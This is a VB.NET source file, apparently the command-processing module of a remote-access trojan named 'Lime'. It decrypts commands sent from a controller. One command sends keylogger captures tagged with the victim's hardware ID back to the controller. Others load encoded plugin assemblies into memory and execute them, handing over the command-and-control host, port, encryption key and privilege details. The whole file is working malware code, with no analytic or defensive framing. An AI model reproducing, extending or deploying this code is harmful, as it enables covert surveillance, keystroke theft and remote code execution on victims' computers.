Namespace Lime

    Public Class C_Commands

        Private Shared ReadOnly SPL = C_Settings.SPL

        Public Shared Sub Data(ByVal b As Byte())
            Dim EN As String = C_Encryption.AES_Decrypt(BS(b))
            Dim A As String() = Split(EN, SPL)

            Try
                Select Case A(0)

                    Case "!PSend"
                        C_Socket._start = True
                        C_Socket.Send("!PStart")

                    Case "!P"
                        C_Socket._stop = True

                    Case "KL"
                        C_Socket.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"))

                    Case "CPL" 'check plugin
                        If GTV(A(1)) = Nothing Then
                            C_Socket.Send("GPL" + SPL + A(1))
                        Else
                            Plugin(GZip(Convert.FromBase64String(GTV(A(1))), False))
                        End If

                    Case "IPL" 'invo plugin
                        STV(A(2), A(1))
                        Plugin(GZip(Convert.FromBase64String(GTV(A(2))), False))

                    Case "IPLM"
                        Plugin(GZip(Convert.FromBase64String(A(1)), False), A(2))
                End Select
            Catch ex As Exception
                C_Socket.Send("MSG" + SPL + "Error! " + ex.Message)
            End Try

        End Sub

        Public Shared Sub Plugin(ByVal B() As Byte, Optional CMD As String = Nothing)
            Try
                For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                    For Each GM In Type_.GetMethods
                        If GM.Name = "CN" Then
                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.ENDOF, C_Socket.SPL, C_Settings.EncryptionKey, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                        ElseIf GM.Name = "MISC" Then
                            GM.Invoke(Nothing, New Object() {C_ID.HWID, CMD})
                        ElseIf GM.Name = "CL" Then
                            GM.Invoke(Nothing, New Object() {C_Settings.DROP, C_Settings.EXE, C_Settings.fullpath, C_ID.Privileges, C_ID.HWID, CMD})
                        End If
                    Next
                Next
            Catch ex As Exception
                C_Socket.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
            End Try
        End Sub

    End Class

End Namespace